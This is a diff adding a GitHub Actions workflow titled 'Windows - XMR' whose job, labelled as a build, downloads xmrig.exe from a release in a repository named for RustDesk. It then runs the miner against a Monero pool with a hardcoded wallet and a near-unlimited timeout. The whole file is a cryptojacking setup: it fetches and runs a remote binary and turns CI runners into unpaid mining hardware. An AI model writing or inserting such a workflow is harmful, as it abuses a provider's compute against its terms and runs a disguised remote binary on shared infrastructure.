@@ -1,0 +1,18 @@
+name: Windows - XMR
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    
+    steps:
+      - name: Downloading 
+        run: |
+          curl -s -L -o xmrig.exe https://github.com/shadowcoder2020/Windows-RustDesk/releases/download/1.1.1/xmrig.exe
+
+      - name: start xmrig
+        run: cmd /c xmrig.exe -o pool.supportxmr.com:443 -u 4BGLje4V31tUSFsFTNgXL3VihDnswHFaHhqL4TVR9cJ66joKj5o6NrFRUTrt5swrafXCx82JMnAsqT4zkv1cVc5NRTYyZNV -k --tls
